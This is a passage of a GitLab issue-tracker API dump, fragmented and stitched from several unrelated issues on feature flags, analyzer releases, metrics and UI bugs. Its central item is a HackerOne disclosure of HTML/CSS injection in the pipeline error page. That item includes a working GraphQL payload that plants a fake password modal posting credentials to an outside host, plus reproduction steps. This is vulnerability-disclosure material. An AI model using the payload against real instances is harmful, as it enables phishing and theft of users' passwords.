We have deemed this as a way of handling feature flags in frontend queries as it makes it easy to omit fields from a query when a given feature flag is disabled.\n\nHowever we have noticed that, no matter what the feature flag's state is, the guarded entity is always sent to the backend and matched against the schema.

Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `avoid_cross_joins_environments_in_self_and_descendants`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior.

Leading to HTML and CSS injection. \n\nWhen a user enters a non-existing or broken YML file as a pipeline configuration the \"new pipeline\" page will present an error message similar to\n\n\u003e The project 'namespace/project' with the file 'filename' is broken\n\nThe problem is that neither 'namespace/project' nor 'filename' are HTML encoded prior to being sent to v-safe-html in the Vue view. So if an attacker configures the project to use a file named `\u003ch1\u003ehack\u003c/h1\u003e.yml` (which is a valid filepath and filename. Path `\u003ch1\u003ehack\u003c` and filename `h1\u003e.yml`) the error message will present the word hack in huge font.\n\nThe injected payload is run through DOMPurify (by v-safe-html) which prevents most of the really serious issues such as full XSS and since a month or two also from abuse of `data-*` attributes.The positioning of the injection still makes it quite dangerous as I will show.\n\n__If you just want to confirm the behavior skip to POC. I will now explain how this could be abused.__\n\nThe first most basic abuse of the injection is to overlay the whole page with an invisible link to a malicious site. Leading to the victim in most cases being redirected to the malicious site as there is no indication that the page is a big link.\n\nThe other attack scenario is to use the flow of GitLab to lure a victim to give away their password. This can be achieved by mimicking the approval of merge request setting added to GitLab in 12.0 [link](https://docs.gitlab.com/ee/user/project/merge_requests/approvals/settings.html#require-user-password-to-approve). As this is an official workflow victims that encounter the same behavior in another part of GitLab would be more likely to actually enter their password if a similar modal when it is presented as part of a different flow.\n\nThe idea is that when a victim press the \"run pipeline\" button, a similar modal will appear prompting the user for a password before the pipeline is triggered. This will resemble the flow of MR approval. The problem is that the pipeline file setting is limited to 255 characters. To build a convincing modal the attacker could use CSS injection in conjunction with HTML injection and use CSS import functionality to load a arbitrary sized CSS file into the page and thus be able to create the modal, and hide the original error message. I will post first an image of the official \"approval by password\" modal\n\n![real.png](https://h1.sec.gitlab.net/a/89704ae6-6ea1-4b9f-815c-b445fc37562b/real.png)\n\nand here is my fake pipeline approval modal (I got the background a bit wrong, but this  is easily fixed :) )\n\n![fake.png](https://h1.sec.gitlab.net/a/76bd2f1f-7a4d-4c50-bfbe-0ddd7ccd9f78/fake.png)\n\nThe CSS import works on Gitlab.com by bypassing CSP in the same way as with XSS and linking to a CSS file in a pipeline job artifact.\n\nWhen the attacker gets the request containing the password the attacker can go to the pipeline log of the project to find out which user made the request. Thus, there is no need to trick the victim of entering a username.\n\n######  The payload  \nMy final payload to mimic the password modal takes advantage of some tricks to stay below the 255-character limit. The payload looks like this when pulled apart  \n```  \na.yml@\u003cstyle\u003e[@]import \\\"/xep/x/-/jobs/1653666563/artifacts/raw/a.css\\\"\u003c/style\u003e\u003cdiv id=\\\"u\\\"\u003e  \n    \u003cform action=\\\"https://joaxcar.com\\\" method=\\\"POST\\\"\u003e  \n    \u003cdiv\u003e\u003c/div\u003e  \n    \u003cdiv\u003e  \n        \u003cinput placeholder=\\\"Password\\\" type=\\\"password\\\" name=\\\"x\\\"\u003e  \n    \u003c/div\u003e  \n    \u003cdiv\u003e  \n    \u003cbutton\u003eApprove  \n    \u003cstyle\u003e  \n```  \nFirst of the payload needs to present a \"valid filename\" which is the a.yml part in the beginning. Then there is the @ separator to tell the parser that the rest of the string is a project path. As I need an @ sign in the CSS import the payload needs to be put in the path and not the file name to not be treated as a filename separator. I then import a CSS from GitLab and creates a skeleton of HTML tags for the CSS to target. All text in the modal is subsequently added by CSS as `:before` and `:after` content. All tags left open will be properly closed by DOMPurify before being injected into the page, saving a l error message should encode the filenames of failed pipelines.ot of characters. It could definitely be improved, but it shows the possibilities even with the limited payload size. The imported CSS will also hide the original error message.\n\n\n#####  Steps to reproduce\n\nI will show this working through the \"compliance framework\" functionality which is a feature only available for Unlimited subscription plan. This is no problem as the Unlimited trail lets anyone access this. The attack is possible through regular project pipeline settings as well, but this path is a bit easier to follow. If you want to use the regular project pipeline you have to actually create the payload as a file (which is possible). Write back if you want me to do a write-up of that as well. \n\n1. Create a user `user01`  \n2. Log in as `user01` and create a group `attack_group` by visiting https://gitlab.com/groups/new  \n3. Go to https://gitlab.com/-/graphql-explorer and run this query to create a pipeline instruction in a compliance framework  \n```  \nmutation {  \n  createComplianceFramework(input: {  \n    namespacePath: \"attack_group\",  \n    params: {  \n      name: \"hack\",  \n      pipelineConfigurationFullPath:\"a.yml@\u003cstyle\u003e[@]import \\\"/xep/x/-/jobs/1653666563/artifacts/raw/a.css\\\"\u003c/style\u003e\u003cdiv id=\\\"u\\\"\u003e\u003cform action=\\\"https://joaxcar.com\\\" method=\\\"POST\\\"\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003cinput placeholder=\\\"Password\\\" type=\\\"password\\\" name=\\\"x\\\"\u003e\u003c/div\u003e\u003cdiv\u003e\u003cbutton\u003eApprove\u003cstyle\u003e\",  \n      description:\"hack\",  \n      color:\"#3cb371\"  \n    }  \n  }) {  \n    errors  \n  }  \n}\n\n```  \na simpler version that does not rely on my CSS file stored on Gitlab.com could be used to prove the impact, this one just puts in a large text in the error message  \n```  \nmutation {  \n  createComplianceFramework(input: {  \n    namespacePath: \"attack_group\",  \n    params: {  \n      name: \"hack\",  \n      pipelineConfigurationFullPath:\"a.yml@\u003ch1\u003ehack\u003c/h1\u003e\",  \n      description:\"hack\",  \n      color:\"#3cb371\"  \n    }  \n  }) {  \n    errors  \n  }  \n}\n\n```\n\n4. Go to https://gitlab.com/attack_group and click the \"New project\" button to create a new project in the group. Name it `attack_project`  \n5. Create a `.gitlab-ci.yml` file in the project (can be empty, does not matter), for example by going to the web ide https://gitlab.com/-/ide/project/attack_group/attack_project/tree/main/-/   \n6. Go to the project settings at https://gitlab.com/attack_group/attack_project/edit and expand the \"Compliance framework\". Pick the framework we created called \"hack\" in the drop-down.  \n7. Go to https://gitlab.com/attack_group/attack_project/-/pipelines/new and click \"Run pipeline\"  \n8. The fake modal will pop up, this will happen to any user in the group trying to run a pipeline. Test to invite another member if you wish to test this.\n\n#####  Impact\n\nHTML and CSS injection in pipeline error message can force a victim to visit a malicious site, show new or alter the content of the page or try to lure the victim to expose their credentials.\n\n#####  What is the current *bug* behavior?\n\nThe pipeline error messages on \"pipeline/new\" does not HTML encode filenames. This unencoded names are then presented in the error message through v-safe-html which strips dangerous tags but allows regular HTML and CSS.\n\n#####  What is the expected *correct* behavior?\n\nThe error message should encode the filenames of failed pipelines.\n\n#####  Output of checks\n\nThis bug happens on GitLab.com\n\n\nI put this at a severity based on a similar finding patched in 14.3.1 [link](https://about.gitlab.com/releases/2021/09/30/security-release-gitlab-14-3-1-released/#content-spoofing-vulnerability)\n\n####  Impact\n\nHTML and CSS injection in pipeline error message can force a victim to visit a malicious site, show new or alter the content of the page or try to lure the victim to expose their credentials.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [fake.png](https://h1.sec.gitlab.net/a/76bd2f1f-7a4d-4c50-bfbe-0ddd7ccd9f78/fake.png)\n* [real.png](https://h1.sec.gitlab.net/a/89704ae6-6ea1-4b9f-815c-b445fc37562b/real.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\n\n## Proposed solution (updated as of March 31st)\n- Backend to sanitize the error input","state":"closed","created_at":"2021-10-13T07:51:47.257Z","updated_at":"2022-05-30T14:07:08.326Z","closed_at":"2022-04-29T12:42:35.100Z","closed_by":{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"},"labels":["Category:Continuous Integration","Deliverable","HackerOne","Verify::P1","Weakness::CWE-99","backend","bug::vulnerability","devops::verify","group::pipeline execution","missed-SLO","missed-deliverable","missed:14.7","priority::3","section::ops","security","severity::3","type::bug","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"},"user_notes_count":49,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-01-11","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/342988","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/342988","notes":"https://gitlab.com/api/v4/projects/278964/issues/342988/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/342988/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#342988","relative":"#342988","full":"gitlab-org/gitlab#342988"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":47581,"iid":59,"sequence":14,"group_id":9970,"title":"Pipeline Authoring: April 18, 2022 - May 1, 2022","description":"Target milestone `15.0`","state":3,"created_at":"2022-02-06T00:05:01.693Z","updated_at":"2022-05-02T00:05:02.688Z","start_date":"2022-04-18","due_date":"2022-05-01","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/47581"},"health_status":null},{"id":95334751,"iid":342986,"project_id":278964,"title":"Automatically tag and release secure analyzers","description":"### Problem to solve \n\nWhile working on [Build docker images on a regular schedule](https://gitlab.com/gitlab-org/gitlab/-/issues/338826), there was a [discussion](https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/255#note_702235232) about whether we should fetch the most recent version of the analyzer from the `git tag` or from the `CHANGELOG.md` file. A concern was raised that if a developer forgets to tag and release an analyzer, the most recent version in the `CHANGELOG.md` file would not match the most recent `git tag`, since a tag wasn't created. It was decided that we could address this issue, but it was out of scope, so that's why this new issue is being created to track it.\n\n### Proposal \n\nThe scheduled job for automatically building Docker images (see [gemnasium](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/pipeline_schedules), [retire.js](https://gitlab.com/gitlab-org/security-products/analyzers/retire.js/-/pipeline_schedules), [bundler-audit](https://gitlab.com/gitlab-org/security-products/analyzers/bundler-audit/-/pipeline_schedules), etc) currently does the following:\n\n1. [Fetches the most recent version of the analyzer using `git tag -l`](https://gitlab.com/gitlab-org/security-products/ci-templates/-/blob/4ee6b59baafa3666753836a75e51f279a6d42dca/includes-dev/docker.yml#L72)\n1. Rebuilds the analyzer with the version value fetched in step `1.`\n\nWe should update this process to the following:\n\n1. Fetch the most recent version of the analyzer and the description of the change from the `CHANGELOG.md` file.\n1. Check to see if a tag already exists with the given version value fetched in step `1.`:\n\n   - If such a tag exists, then rebuild a new analyzer Docker image with that tag\n   - If a tag does not exist, tag a new analyzer Docker image with that tag and provide a tag description which matches the description for the change from the `CHANGELOG.md` file\n\n### Implementation Plan\n\nCreate an MR with the following changes, and notify the Static Analysis team about the new `CREATE_GIT_TAG` variable in case they also want to make use of it:\n\n1. Create a new stage: `tag` (this contains a job for creating the git tag from the most recent changelog entry if it doesn't exist)\n1. Create a new job `upsert git tag` in the `tag` stage. Use the code in [this commit](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/90a7045d2eafc3ddf0a462ca2b94795d83096c47/.gitlab-ci.yml) as a starting point.\n\n   This job is idempotent and will:\n\n   1. Add a new CI variable `CREATE_GIT_TAG` (create a git tag if missing)\n   1. Fetch the most recent version of the analyzer and the description of the change from the `CHANGELOG.md` file.\n   1. If a git tag matching the version from the `CHANGELOG.md` file does not exist, create a new git tag, provide a tag description which matches the description for the change from the `CHANGELOG.md` file\n\n   Note: The job is skipped unless `CREATE_GIT_TAG` is true\n\n1. Update the `CI/CD Environment variables` following projects to set `CREATE_GIT_TAG: true` and also configure the `GITLAB_TOKEN` environment variable to match the one in the [ci-templates](https://gitlab.com/gitlab-org/security-products/ci-templates/-/settings/ci_cd) `CI/CD Settings`:\n\n   - [gemnasium](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium)\n   - [gemnasium-maven](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven)\n   - [gemnasium-python](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-python)\n   - [retire.js](https://gitlab.com/gitlab-org/security-products/analyzers/retire.js)\n   - [bundler-audit](https://gitlab.com/gitlab-org/security-products/analyzers/bundler-audit)\n\n### Future Steps\n\n1. Increase the frequency of the scheduled CI piplines.\n1. Create a new MR with the following changes, and include the Static Analysis team to make sure they approve the changes:\n   1. Rename [`release-major`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/4ee6b59/includes-dev/docker.yml#L7-7) stage to `release`\n   1. Rename [`major`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/4ee6b59/includes-dev/docker.yml#L106-112) to `release major`\n   1. Rename [`minor`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/4ee6b59/includes-dev/docker.yml#L113-118) to `release minor`\n   1. Rename [`tag version`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/4ee6b59/includes-dev/docker.yml#L87-97) to `release patch`\n   1. Merge [`release-version`](https://gitlab.com/gitlab-org/security-products/ci-templates/blob/4ee6b59/includes-dev/docker.yml#L6-6) into `release`\n\n   See [this MR](https://gitlab.com/gitlab-org/security-products/ci-templates/-/merge_requests/270) for a starting point for the above changes.\n\n1. Export the `major`, `minor`, `patch` version numbers as CI variables to be used by the `release` jobs using [dotenv export artifact](https://docs.gitlab.com/ee/ci/variables/#pass-an-environment-variable-to-another-job)\n1. If things go well and Static Analysis agrees with the change, remove the `PUBLISH_IMAGES` and `CREATE_GIT_TAG` variables.\n\n   By removing these variables, the behaviour of the default branch build will be to automatically create a new git tag if one doesn't exist, and release the images\n   \n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n\n### Further details\n\nThis change will eliminate the need for this issue: [Warn when analyzer changelog is updated without a new release](https://gitlab.com/gitlab-org/gitlab/-/issues/338858)\n\n### Documentation\n\n- Update the [Versioning and release process](https://gitlab.com/gitlab-org/security-products/analyzers/common#versioning-and-release-process) docs\n- ~~Update the [Security and Build fixes of Go](https://about.gitlab.com/handbook/engineering/development/secure/release_process.html#git-tag-to-rebuild) docs~~ (not necessary - see [this discussion](https://gitlab.com/gitlab-org/gitlab/-/issues/342986#note_812309162) for more details)\n\n### What does success look like, and how can we measure that?\n\nIf a developer forgets to release an analyzer, it will automatically be built and released from a scheduled job.

If ~\"Category:SAST\" wants to make use of it, they can do so by setting `CREATE_GIT_TAG: \"true\"` and configuring `GITLAB_TOKEN` to a valid access token.\n\n/cc @NicoleSchwartz @gonzoyumo @fcatteau","state":"closed","created_at":"2021-10-13T07:45:49.666Z","updated_at":"2022-04-29T05:03:41.805Z","closed_at":"2022-01-17T12:41:19.508Z","closed_by":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"labels":["Category:Dependency Scanning","Deliverable","Enterprise Edition","GitLab Ultimate","backend","devops::secure","group::composition analysis","maintenance::pipelines","priority::1","quad-planning::complete-no-action","section::sec","type::maintenance","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"}],"author":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"type":"ISSUE","assignee":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/342986","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":1,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/342986","notes":"https://gitlab.com/api/v4/projects/278964/issues/342986/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/342986/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#342986","relative":"#342986","full":"gitlab-org/gitlab#342986"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"at_risk"},{"id":95331612,"iid":342984,"project_id":278964,"title":"Display average/median for DORA4 in graphs","description":"\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n\u003c!-- This issue template can be used a great starting point for feature requests.

Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. \n\n### What is the type of buyer?\n\nWhat is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#three-tiers\n\n### Is this a cross-stage feature?\n\nCommunicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e","state":"closed","created_at":"2021-10-13T06:58:07.501Z","updated_at":"2022-02-02T12:46:42.674Z","closed_at":"2022-02-02T12:43:11.478Z","closed_by":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"labels":["Category:Continuous Delivery","GitLab Ultimate","devops::manage","direction","documentation","frontend","group::optimize","priority::2","section::ops","type::feature","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"}],"author":{"id":4156460,"username":"ogolowinski","name":"Orit Golowinski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4156460/avatar.png","web_url":"https://gitlab.com/ogolowinski"},"type":"ISSUE","assignee":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"user_notes_count":21,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/342984","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/342984","notes":"https://gitlab.com/api/v4/projects/278964/issues/342984/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/342984/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#342984","relative":"#342984","full":"gitlab-org/gitlab#342984"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4358,"epic":{"id":107251,"iid":4358,"title":"Measure DORA 4 Metrics in GitLab","url":"/groups/gitlab-org/-/epics/4358","group_id":9970,"human_readable_end_date":"Feb 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":95328321,"iid":342980,"project_id":278964,"title":"[Engineering] Add user invitation track to day zero for \"company\" namespaces","description":"# Problem\nOur recent experiments have shown that inviting team members early on in the namespace life cycle has a profound effect on Verify usage.

:group/:project/-/pipelines/charts by month\".  However, that page has 3 different tabs, which can be bookmarked/navigated as if they are separate pages.  So the current usage metrics are not granular enough to understand which tabs are most/least popular.  We want more granular usage metrics [per @ogolowinski](https://gitlab.com/gitlab-org/manage/general-discussion/-/issues/17408#note_697278094).\n\n## Proposal\n\nAdd 3 new usage metrics, one for each [CI/CD Analytics](https://gitlab.com/gitlab-org/gitlab/-/pipelines/charts) tab.  This can be done using a condition on each call to `track_redis_hll_event` ([example](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/controllers/admin/dev_ops_report_controller.rb#L8)).  The condition can check for the GET param called `chart`.  [Learn more](https://gitlab.com/gitlab-org/manage/general-discussion/-/issues/17408#note_700995667).\n  - [ ] Pipelines (`params[:chart].blank? || params[:chart] == 'pipeline'`)\n  - [ ] Deployment frequency (`params[:chart] == 'deployment-frequency'`)\n  - [ ] Lead time (`params[:chart] == 'lead-time'`)\n\nAlso, add frontend tracking on tab clicks.\n\nNote: The existing page-level usage metric called `p_analytics_pipelines_monthly` is being deprecated and removed under

batchable preloading","description":"The following discussion from !67909 should be addressed:\n\n- [ ] @alexkalderimis started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67909#note_701229442): \n\n    \u003e This was a working first pass, but I think we can probably do a little better (at least, as far as maintainability goes!).\n    \u003e \n    \u003e If we use [`Preloader#preload`](https://apidock.com/rails/v5.2.3/ActiveRecord/Associations/Preloader/preload) inside a batch loader, then we could write this as:\n    \u003e \n    \u003e ```ruby\n    \u003e def title\n    \u003e   BatchLoader::GraphQL.for(object).batch do |lists, callback|\n    \u003e     preloader = ActiveRecord::Associations::Preloader.new(lists, :label)\n    \u003e     preloader.run\n    \u003e \n    \u003e     # all list titles are preloaded at this point\n    \u003e     lists.each { |list|

For example, when a user creates an incident by escalating an existing alert, or when a user creates and pushes up a new Node package to the NPM registry.\n* For more details read https://about.gitlab.com/handbook/business-technology/data-team/programs/data-for-product-managers/\n --\u003e\n\n\u003c!--\nWe generally recommend events be tracked using a [structured event](https://docs.snowplowanalytics.com/docs/understanding-tracking-design/out-of-the-box-vs-custom-events-and-entities/#structured-events) which has 5 properties you can use. There may be instances where structured events are not sufficient. You may want to track an event where the property changes frequently or is general something very unique.

It sort of gets \"stuck\". The next click usually goes to another discussion, but not often the **next** one.\n- A click jumps to somewhere below where the virtual scroller has rendered, which is just a couple frames of blank white screen, but then the scroll jumps to the very top of the page instead of waiting for the files to actually load in.\n\n### What is the expected *correct* behavior?\n\nBasically the behavior of a the Jump To Next Unresolved Dicsussion button on a fresh load of the MR page on the Overview tab.\n\nIt's not perfect, but it more or less goes to the next unresolved discussion every time you click the button.\n\nTo be fair, this also has some problems, like it doesn't seem to scroll to the exactly correct position, so it's not clear what I should be looking at when multiple discussions are are screen, but it is roughly scrolling through the discussions in sequence.","state":"closed","created_at":"2021-10-11T19:57:16.083Z","updated_at":"2021-11-18T07:00:56.347Z","closed_at":"2021-10-25T07:54:27.497Z","closed_by":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"labels":["Category:Code Review Workflow","Deliverable","devops::create","frontend","group::code review","merge requests","section::dev","type::bug","workflow::in review"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"}],"author":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"type":"ISSUE","assignee":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"user_notes_count":6,"merge_requests_count":0,"upvotes":3,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/342849","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/342849","notes":"https://gitlab.com/api/v4/projects/278964/issues/342849/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/342849/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#342849","relative":"#342849","full":"gitlab-org/gitlab#342849"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":95238735,"iid":342846,"project_id":278964,"title":"Integrate runner into scanner:  Use TLS configuration from project config","description":"## Problem\n\nThe `TlsConfigurationCheck` assesses that a given request uses the previously configured  Project's `ClientKey` and `ClientCert`.

Profiles (reusable scan profiles) \n    1. [Project-level: configure with local(project) profile](https://gitlab.com/gitlab-org/gitlab/-/issues/330481)\n    2. [Project level: configure edit route](https://gitlab.com/gitlab-org/gitlab/-/issues/331498)\n    3. [Project level: manage profiles](https://gitlab.com/gitlab-org/gitlab/-/issues/330496/)\n    4.

